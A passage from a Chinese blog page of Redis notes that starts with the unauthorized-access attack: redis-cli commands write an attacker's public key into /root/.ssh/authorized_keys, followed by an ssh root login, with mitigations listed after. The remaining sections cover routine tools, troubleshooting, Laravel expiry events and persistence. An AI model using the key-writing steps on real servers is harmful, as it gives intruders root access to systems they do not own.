class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config get dir</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>) <span class="string">"dir"</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>) <span class="string">"/root/.ssh"</span></span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config set dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; save</span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line">这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：</span><br><span class="line"> </span><br><span class="line">$ ssh –i  id_rsa root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br><span class="line">即可远程利用自己的私钥登录该服务器。</span><br><span class="line">当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</span><br><span class="line">可以使用Pocsuite（http:<span class="comment">//github.com/knownsec/pocsuite）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.waitalone.cn/redis-unauthorized-of-expolit.html </span></span><br><span class="line">配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口<span class="number">6379</span></span><br><span class="line">配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中</span><br><span class="line">配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度</span><br><span class="line">好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config</span><br></pre></td></tr></table></figure>
<h3 id="Redis-查看所有-key-的-value-值所占内存大小"><a href="#Redis-查看所有-key-的-value-值所占内存大小" class="headerlink" title="Redis 查看所有 key 的 value 值所占内存大小"></a>Redis 查看所有 key 的 value 值所占内存大小</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools#generate-memory-report</span></span><br><span class="line">$ pip install rdbtools python-lzf</span><br><span class="line">$ git clone https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools</span></span><br><span class="line">$ cd redis-rdb-tools</span><br><span class="line">$ sudo python setup.py install</span><br><span class="line"></span><br><span class="line">接下来找到 redis 的 dump.rdb 位置</span><br><span class="line"></span><br><span class="line">首先定位到 redis.conf 位置</span><br><span class="line"></span><br><span class="line">$ whereis redis.conf</span><br><span class="line">redis: <span class="regexp">/etc/</span>redis.conf</span><br><span class="line">$ cat /etc/redis.conf | grep dir | grep redis</span><br><span class="line">dir /<span class="keyword">var</span>/lib/redis</span><br><span class="line">$ cat /etc/redis.conf | grep dump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">综上，得知其路径为：/<span class="keyword">var</span>/lib/redis/dump.rdb</span><br><span class="line"></span><br><span class="line">按内存值导出 csv</span><br><span class="line"></span><br><span class="line">$ rdb -c memory /<span class="keyword">var</span>/lib/redis/dump.rdb &gt; <span class="regexp">/tmp/</span>redis.csv</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33211</span></span><br></pre></td></tr></table></figure>
<h3 id="管理平台工具-RedisManager"><a href="#管理平台工具-RedisManager" class="headerlink" title="管理平台工具 RedisManager"></a>管理平台工具 RedisManager</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">github项目地址：https:<span class="comment">//github.com/ngbdf/redis-manager</span></span><br><span class="line"></span><br><span class="line">下载安装：</span><br><span class="line">系统环境：</span><br><span class="line">LINUX</span><br><span class="line">JDK1<span class="number">.8</span></span><br><span class="line"></span><br><span class="line">#Releases</span><br><span class="line">https:<span class="comment">//github.com/ngbdf/redis-manager/releases</span></span><br><span class="line"></span><br><span class="line">#当前最新版本 1.1</span><br><span class="line">wget https:<span class="comment">//github.com/ngbdf/redis-manager/releases/download/redismanager-1.1-release/redis-manager-1.1-release.tar.gz</span></span><br><span class="line"></span><br><span class="line">#创建数据库</span><br><span class="line">create database dbname <span class="keyword">default</span> character set utf8mb4 collate utf8mb4_general_ci;</span><br><span class="line"></span><br><span class="line">#解压</span><br><span class="line">tar xf redis-manager<span class="number">-1.1</span>-release.tar.gz </span><br><span class="line">cd redis-manager<span class="number">-1.1</span>/</span><br><span class="line"></span><br><span class="line">#修改配置文件</span><br><span class="line">cd conf/</span><br><span class="line">vim application.yml</span><br><span class="line"></span><br><span class="line">#端口号</span><br><span class="line">server:</span><br><span class="line">  tomcat.uri-encoding: UTF<span class="number">-8</span></span><br><span class="line">  port: <span class="number">8182</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#数据库，仅需自己创建数据库即可，相关表会自动生成</span><br><span class="line">  datasource:</span><br><span class="line">      name: dbname</span><br><span class="line">      driver-class-name: com.mysql.jdbc.Driver</span><br><span class="line">      url: jdbc:mysql:<span class="comment">//192.168.1.1:3306/dbname?useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">      username: user</span><br><span class="line">      password: passwd</span><br><span class="line"></span><br><span class="line">启动访问：</span><br><span class="line">#执行bin目录下的start.sh脚本</span><br><span class="line">./bin/start.sh </span><br><span class="line"></span><br><span class="line">#查看进程</span><br><span class="line">ps -ef |grep java</span><br><span class="line"></span><br><span class="line">#查看端口</span><br><span class="line">netstat -lntp |grep <span class="number">8182</span></span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8182</span>                 :::*                    LISTEN      <span class="number">7774</span>/java   </span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/430.html</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis监控工具-redis-stat"><a href="#Redis监控工具-redis-stat" class="headerlink" title="Redis监控工具 redis-stat"></a>Redis监控工具 redis-stat</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/junegunn/redis-stat</span></span><br><span class="line">yum install ruby ruby-devel rubygem</span><br><span class="line">#更换gem源，使用国内镜像源下载更快</span><br><span class="line">gem source -a https:<span class="comment">//ruby.taobao.org/ #添加淘宝源</span></span><br><span class="line">gem source -r http:<span class="comment">//rubygems.org/ #删除境外源</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# gem install redis --version 3.0.0 #默认最新是4.0版本</span><br><span class="line">Fetching: redis<span class="number">-3.0</span><span class="number">.0</span>.gem (<span class="number">100</span>%)</span><br><span class="line">[root@localhost ~]# gem install redis-stat</span><br><span class="line">Fetching: ansi256<span class="number">-0.2</span><span class="number">.5</span>.gem (<span class="number">100</span>%)</span><br><span class="line">Successfully installed ansi256<span class="number">-0.2</span><span class="number">.5</span></span><br><span class="line">使用redis-stat 命令行形式</span><br><span class="line">[root@localhost ~]# redis-stat 127.0.0.1:6379</span><br><span class="line">/usr/local/rvm/gems/ruby<span class="number">-2.4</span><span class="number">.1</span>/gems/sinatra<span class="number">-1.3</span><span class="number">.6</span>/lib/sinatra/base.rb:<span class="number">1070</span>: warning: constant ::Fixnum is deprecated</span><br><span class="line">使用redis-stat webserver形式</span><br><span class="line">[root@localhost ~]# redis-stat 127.0.0.1:6379 --server=6666 --daemon #端口自定义</span><br><span class="line">/usr/local/rvm/gems/ruby<span class="number">-2.4</span><span class="number">.1</span>/gems/sinatra<span class="number">-1.3</span><span class="number">.6</span>/lib/sinatra/base.rb:<span class="number">1070</span>: warning: constant ::Fixnum is deprecated</span><br><span class="line"></span><br><span class="line">打开http:<span class="comment">//服务器ip地址:8000 访问</span></span><br><span class="line"></span><br><span class="line">集群也是一样的</span><br><span class="line">redis-stat <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7000</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7001</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7002</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7003</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7004</span> <span class="number">192.168</span><span class="number">.16</span><span class="number">.186</span>:<span class="number">7005</span> --</span><br><span class="line">https:<span class="comment">//me.jinchuang.org/archives/233.html</span></span><br></pre></td></tr></table></figure>
<h3 id="loading-redis-is-loading-the-dataset-in-memory-laravel"><a href="#loading-redis-is-loading-the-dataset-in-memory-laravel" class="headerlink" title="loading redis is loading the dataset in memory laravel"></a>loading redis is loading the dataset in memory laravel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# redis-cli</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ping</span><br><span class="line">(error) MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs <span class="keyword">for</span> details about the error.</span><br><span class="line"></span><br><span class="line">ps aux|grep redis|grep -v grep|awk <span class="string">'&#123;print $2&#125;'</span>|xargs kill <span class="number">-9</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>[<span class="number">1</span>]&gt; ping</span><br><span class="line">(error) LOADING Redis is loading the dataset <span class="keyword">in</span> memory</span><br><span class="line"></span><br><span class="line">echo <span class="string">'vm.overcommit_memory = 1'</span> &gt;&gt; <span class="regexp">/etc/</span>sysctl.conf</span><br><span class="line">sysctl vm.overcommit_memory=<span class="number">1</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ping</span><br><span class="line">PONG</span><br><span class="line">但是写不进Redis </span><br><span class="line"></span><br><span class="line">Redis被配置为保存数据库快照，但它目前不能持久化到硬盘。用来修改集合数据的命令不能用。请查看Redis日志的详细错误信息。</span><br><span class="line"></span><br><span class="line">原因</span><br><span class="line">强制关闭Redis快照导致不能持久化。</span><br><span class="line"></span><br><span class="line">解决方案</span><br><span class="line">将stop-writes-on-bgsave-error设置为no</span><br><span class="line"></span><br><span class="line">➜  sh redis-cli -h <span class="number">172.16</span><span class="number">.200</span>.xx -p <span class="number">6378</span></span><br><span class="line"><span class="number">172.16</span><span class="number">.200</span>.xx:<span class="number">6378</span>&gt; config set stop-writes-on-bgsave-error no</span><br><span class="line">找到运维排查机器硬盘内存是否满了，果然，还真是硬盘内存满了，导致持久化保存快照时，发生异常。</span><br><span class="line">[root@localhost ~]# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/sda2       <span class="number">4.0</span>G  <span class="number">2.1</span>G  <span class="number">1.8</span>G  <span class="number">55</span>% <span class="regexp">/</span></span><br><span class="line"><span class="regexp">tmpfs           5.9G     0  5.9G   0% /</span>dev/shm</span><br><span class="line">/dev/sda7        <span class="number">96</span>G   <span class="number">11</span>G   <span class="number">80</span>G  <span class="number">12</span>% <span class="regexp">/data0</span></span><br><span class="line"><span class="regexp">/</span>dev/sda5       <span class="number">7.9</span>G  <span class="number">278</span>M  <span class="number">7.3</span>G   <span class="number">4</span>% <span class="regexp">/tmp</span></span><br><span class="line"><span class="regexp">/</span>dev/sda3        <span class="number">12</span>G  <span class="number">8.8</span>G  <span class="number">2.5</span>G  <span class="number">79</span>% <span class="regexp">/usr</span></span><br><span class="line"><span class="regexp">/</span>dev/sda6       <span class="number">7.9</span>G  <span class="number">7.8</span>G     <span class="number">0</span> <span class="number">100</span>% <span class="regexp">/var</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">127.0.0.1:6379&gt; config get dir</span></span><br><span class="line"><span class="regexp">1) "dir"</span></span><br><span class="line"><span class="regexp">2) "/</span><span class="keyword">var</span>/lib/redis<span class="string">"</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; config get dbfilename</span></span><br><span class="line"><span class="string">1) "</span>dbfilename<span class="string">"</span></span><br><span class="line"><span class="string">2) "</span>dump.rdb<span class="string">"</span></span><br><span class="line"><span class="string">持久化文件/varlib/redis/dump.rdb 满了 写不进去了 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshots</span></span><br><span class="line"><span class="string">http://ju.outofmemory.cn/entry/197760</span></span><br></pre></td></tr></table></figure>
<h3 id="提前10分钟提醒信息"><a href="#提前10分钟提醒信息" class="headerlink" title="提前10分钟提醒信息"></a>提前10分钟提醒信息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>修改redis配置文件</span><br><span class="line"></span><br><span class="line">notify-keyspace-events <span class="string">"Ex"</span></span><br><span class="line"><span class="number">2.</span>修改datebase配置文件</span><br><span class="line"></span><br><span class="line"> <span class="string">'notify_cache'</span> =&gt; [</span><br><span class="line">            <span class="string">'host'</span> =&gt; env(<span class="string">'REDIS_HOST'</span>, <span class="string">'127.0.0.1'</span>),</span><br><span class="line">            <span class="string">'password'</span> =&gt; env(<span class="string">'REDIS_PASSWORD'</span>, <span class="literal">null</span>),</span><br><span class="line">            <span class="string">'port'</span> =&gt; env(<span class="string">'REDIS_PORT'</span>, <span class="number">6379</span>),</span><br><span class="line">            <span class="string">'database'</span> =&gt; env(<span class="string">'REDIS_DB'</span>, <span class="number">4</span>),</span><br><span class="line">            <span class="string">'read_write_timeout'</span> =&gt; <span class="number">-1</span>,  <span class="comment">// 读写超时设定</span></span><br><span class="line">        ],</span><br><span class="line"><span class="number">3.</span>创建过期key</span><br><span class="line"></span><br><span class="line">$ttl = strtotime($data[<span class="string">'return_time'</span>]) - time() - <span class="number">600</span>;</span><br><span class="line">$redis = Redis::connection(<span class="string">'notify_cache'</span>);</span><br><span class="line">$redis-&gt;set(<span class="string">'NOTIFY_CONFIRM:'</span>.$id,$id);</span><br><span class="line">$redis-&gt;expire(<span class="string">'NOTIFY_CONFIRM:'</span>.$id,$ttl);</span><br><span class="line"><span class="number">4.</span>创建监听队列</span><br><span class="line"></span><br><span class="line">$cache_db = config(<span class="string">'database.redis.notify_cache.database'</span>,<span class="number">4</span>);</span><br><span class="line">$pattern = <span class="string">'__keyevent@'</span>.$cache_db.<span class="string">'__:expired'</span>;</span><br><span class="line">Redis::connection(<span class="string">'notify_cache'</span>)-&gt;subscribe($pattern,<span class="function"><span class="keyword">function</span> (<span class="params">$channel</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 订阅键过期事件</span></span><br><span class="line">    Log::info(<span class="string">'-----notify-----'</span>.$channel);</span><br><span class="line">    $key_type = str_before($channel,<span class="string">':'</span>);</span><br><span class="line">    <span class="keyword">switch</span> ($key_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'NOTIFY_CONFIRM'</span>:</span><br><span class="line">            $id = str_after($channel,<span class="string">':'</span>);    <span class="comment">// 取出学员ID</span></span><br><span class="line">            $client  = Client::find($id);</span><br><span class="line">            <span class="keyword">if</span> ($client) &#123;</span><br><span class="line">                  <span class="comment">//业务逻辑</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">加入队列https:<span class="comment">//learnku.com/articles/34526</span></span><br><span class="line"><span class="keyword">const</span> LISTEN_REDIS_NAME = <span class="string">'eeop:axb:bind_log'</span>;<span class="comment">//定时解绑做判断处理</span></span><br><span class="line"><span class="keyword">const</span> AUTO_TIMEOUT = <span class="number">60</span>;<span class="comment">//自动解绑60s</span></span><br><span class="line"><span class="comment">//加入队列 有序队列</span></span><br><span class="line">$<span class="keyword">this</span>-&gt;redis::zadd(self::LISTEN_REDIS_NAME, time() + self::AUTO_TIMEOUT, $<span class="keyword">this</span>-&gt;bind_id);</span><br><span class="line"><span class="number">2.</span> 解绑服务</span><br><span class="line"></span><br><span class="line">$list = $<span class="keyword">this</span>-&gt;redis::ZRANGEBYSCORE(self::LISTEN_REDIS_NAME,<span class="number">0</span>,time());</span><br><span class="line">foreach ($list <span class="keyword">as</span> $value)&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;redis::zrem(self::LISTEN_REDIS_NAME, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/588891acd44c</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-持久化存储"><a href="#Redis-持久化存储" class="headerlink" title="Redis 持久化存储"></a>Redis 持久化存储</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">一种是 aof 日志追加的方式，另外一种是 rdb 数据快照的方式。</span><br><span class="line">RDB 持久化存储即是将 redis 存在内存中的数据以快照的形式保存在本地磁盘中。</span><br><span class="line"></span><br><span class="line">手动备份通过 save 命令和 bgsave 命令。save 是同步阻塞，而 bgsave 是非阻塞 (阻塞实际发生在 fork 的子进程中)。因此，在我们实际过程中大多是使用 bgsave 命令实现备份.</span><br><span class="line">自动备份</span><br><span class="line"></span><br><span class="line">a. 修改配置项 save m n 即表示在 m 秒内执行了 n 次命令则进行备份.</span><br><span class="line"></span><br><span class="line">b. 当 Redis 从服务器项主服务器发送复制请求时，主服务器则会使用 bgsave 命令生成 rbd 文件，然后传输给从服务器.</span><br><span class="line"></span><br><span class="line">c. 当执行 debug reload 命令时也会使用 save 命令生成 rdb 文件.</span><br><span class="line"></span><br><span class="line">d. 当使用 shutdown 命令关掉服务时，如果没有启用 aof 方式实现持久化则会采用 bgsave 的方式做持久化。同时 shutdown 后面可以加备份参数 [nosave|save].</span><br><span class="line"></span><br><span class="line">优势:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 文件实现的数据快照，全量备份，便于数据的传输。比如我们需要把 A 服务器上的备份文件传输到 B 服务器上面，直接将 rdb 文件拷贝即可.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 文件采用压缩的二进制文件，当重启服务时加载数据文件，比 aof 方式更快.</span><br><span class="line"></span><br><span class="line">劣势:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>rbd 采用加密的二进制格式存储文件，由于 Redis 各个版本之间的兼容性问题也导致 rdb 由版本兼容问题导致无法再其他的 Redis 版本中使用.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 时效性差，容易造成数据的不完整性。因为 rdb 并不是实时备份，当某个时间段 Redis 服务出现异常，内存数据丢失，这段时间的数据是无法恢复的，因此易导致数据的丢失.</span><br><span class="line">当遇到磁盘写满情况，可以使用如下命令来切换存储磁盘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// dirName则是新的存储目录名(该方式同样适用于aof格式)</span></span><br><span class="line"></span><br><span class="line">config set dir dirName</span><br><span class="line">AOF 持久化存储是什么</span><br><span class="line"></span><br><span class="line">录 redis 的操作日志，将 redis 执行过的命令记录下载，当我们需要数据恢复时，redis 去重新执行一次日志文件中的命令</span><br><span class="line"><span class="comment">// 将no改为yes，控制aof开启与否</span></span><br><span class="line"></span><br><span class="line">appendonly no</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制aof文件名称，存储的目录便是dir配置项</span></span><br><span class="line"></span><br><span class="line">appendfilename <span class="string">"appendonly.aof"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 三种备份策略(三者只需要开启以一个即可)</span></span><br><span class="line"></span><br><span class="line"># appendfsync always // 命令写入立即写入磁盘</span><br><span class="line"></span><br><span class="line">appendfsync everysec <span class="comment">// 每秒实现文件的同步，写入磁盘</span></span><br><span class="line"></span><br><span class="line"># appendfsync no // 随机进行文件的同步,同步操作则交给操作系统来负责，通常时间是最长30s</span><br><span class="line"></span><br><span class="line">优点:</span><br><span class="line"></span><br><span class="line">多种文件写入 (fsync) 策略.</span><br><span class="line"></span><br><span class="line">数据实时保存，数据完整性强。即使丢失某些数据，制定好策略最多也是一秒内的数据丢失.</span><br><span class="line"></span><br><span class="line">可读性强，由于使用的是文本协议格式来存储的数据，可有直接查看操作的命令，同时也可以手动改写命令.</span><br><span class="line"></span><br><span class="line">缺点:</span><br><span class="line"></span><br><span class="line">文件体积过大，加载速度比 rbd 慢。由于 aof 记录的是 redis 操作的日志，一些无效的，可简化的操作也会被记录下来，造成 aof 文件过大。但该方式可以通过文件重写策略进行优化.</span><br><span class="line"></span><br><span class="line">选择 AOF 还是 RDB 进行数据的持久化</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 针对不同的情况来选择，建议使用两种方式相结合.</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 针对数据安全性、完整性要求高的采用 aof 方式.</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 针对不太重要的数据可以使用 rdb 方式.</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 对于数据进行全量备份，便于数据备份的可以采用 rdb 方式.  https:<span class="comment">//learnku.com/articles/33954</span></span><br></pre></td></tr></table></figure>
<h3 id="文章投票"><a href="#文章投票" class="headerlink" title="文章投票"></a>文章投票</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 